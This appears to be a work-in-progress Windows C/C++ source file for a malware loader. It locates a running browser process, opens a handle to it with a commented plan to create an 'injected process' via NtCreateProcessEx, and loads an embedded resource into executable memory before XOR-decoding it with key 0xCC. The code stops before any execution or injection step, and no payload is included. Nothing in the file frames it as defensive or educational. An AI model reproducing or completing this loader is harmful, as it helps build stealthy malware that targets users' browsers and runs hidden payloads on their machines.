/* 1. Rename conflicting structs AND their pointer types to fix conflicting with windows APIs or that's what AI told me */
#define _FILE_STAT_INFORMATION           _SDK_FILE_STAT_INFORMATION
#define _FILE_STAT_LX_INFORMATION        _SDK_FILE_STAT_LX_INFORMATION
#define _FILE_CASE_SENSITIVE_INFORMATION _SDK_FILE_CASE_SENSITIVE_INFORMATION

#define FILE_STAT_INFORMATION            SDK_FILE_STAT_INFORMATION
#define FILE_STAT_LX_INFORMATION         SDK_FILE_STAT_LX_INFORMATION
#define FILE_CASE_SENSITIVE_INFORMATION  SDK_FILE_CASE_SENSITIVE_INFORMATION

#define PFILE_STAT_INFORMATION           SDK_PFILE_STAT_INFORMATION
#define PFILE_STAT_LX_INFORMATION        SDK_PFILE_STAT_LX_INFORMATION
#define PFILE_CASE_SENSITIVE_INFORMATION SDK_PFILE_CASE_SENSITIVE_INFORMATION

#include <phnt_windows.h>

#undef _FILE_STAT_INFORMATION
#undef _FILE_STAT_LX_INFORMATION
#undef _FILE_CASE_SENSITIVE_INFORMATION

#undef FILE_STAT_INFORMATION
#undef FILE_STAT_LX_INFORMATION
#undef FILE_CASE_SENSITIVE_INFORMATION
#undef PFILE_STAT_INFORMATION
#undef PFILE_STAT_LX_INFORMATION
#undef PFILE_CASE_SENSITIVE_INFORMATION
#include <phnt.h>

#include<stdio.h>
#include<tlhelp32.h>
#include <stdint.h>

/*
// might need later
#pragma comment(lib, "ntdll.lib")

typedef NTSTATUS (__stdcall *NT_OPEN_FILE)(OUT PHANDLE
FileHandle, IN ACCESS_MASK DesiredAccess, IN POBJECT_ATTRIBUTES
ObjectAttributes, OUT PIO_STATUS_BLOCK IoStatusBlock, IN ULONG
ShareAccess, IN ULONG OpenOptions);

extern "C" void __stdcall RtlGetVersion(OSVERSIONINFO*);
*/
bool CheckIfBrowser(wchar_t* processName) {
      bool res = false;
      const wchar_t* browsers[] = {
            L"chrome.exe",
            L"msedge.exe",
            L"firefox.exe",
            L"opera.exe"
      };
      for(const wchar_t* browser : browsers) {
            if(wcscmp(browser, processName) == 0) res = true;
      }

      return res;
}

void test_phnt(void) {
      PROCESS_BASIC_INFORMATION pbi = { sizeof(PROCESS_BASIC_INFORMATION) };
      ULONG returnLength = 0; 

      NTSTATUS status = NtQueryInformationProcess(
            NtCurrentProcess(),
            ProcessBasicInformation,
            &pbi,
            sizeof(pbi),
            &returnLength
      );

      if(!NT_SUCCESS(status)) printf("[*] IT DIDN'T WORK CALL THE AMBULANCE: 0x%08X\n", status);
      else printf("[*] CALL THE AMBULANCE BUT NOT FOR ME: %p\n", pbi.PebBaseAddress);
}

int main() {
      // Creates a snapshot of processes
      HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
      if(hSnapshot == INVALID_HANDLE_VALUE) {
            printf("[*] Failed to enumerate process");
            //exit(EXIT_FAILURE);
      }

      PROCESSENTRY32 currentProcess = { sizeof(PROCESSENTRY32) };

      // Process32First(snapshot, [out] processStructure) -> PROCESSENTRY32

      printf("\t[Process name] \t[PID]\t[PPID] \n");
      
      if(!Process32First(hSnapshot, &currentProcess)) {
            printf("[*] Failed to read snapshot");
            CloseHandle(hSnapshot);
            //exit(EXIT_FAILURE);
      }

      do {
      if(CheckIfBrowser(currentProcess.szExeFile)) {
            printf("%25S %8d %8d \n",
                        currentProcess.szExeFile, currentProcess.th32ProcessID, currentProcess.th32ParentProcessID);
            break;
       }
      } while(Process32Next(hSnapshot, &currentProcess));

      // OpenProcess to obtain a handle for NTCreateProcessEx
      HANDLE hProcess = OpenProcess(
        PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
        FALSE,                                     
        currentProcess.th32ProcessID                                  
    );
      
      // HANDLE hInjectedProcess = NtCreateProcessEx();
      test_phnt();

      // Loading the resource
      HRSRC hResource = FindResourceW(NULL, L"MAIN", L"CONFIG");
      HGLOBAL resourceData = LoadResource(NULL, hResource);
      DWORD resourceSize = SizeofResource(NULL, hResource);
      void* exec = VirtualAlloc(NULL, resourceSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
      memcpy(exec, resourceData, resourceSize);
      uint8_t k = 0xCC;
      uint8_t* p = (uint8_t*)exec;
      for(size_t i = 0; i < resourceSize; ++i) {
           p[i] ^= k;
      }

      return 0;
}
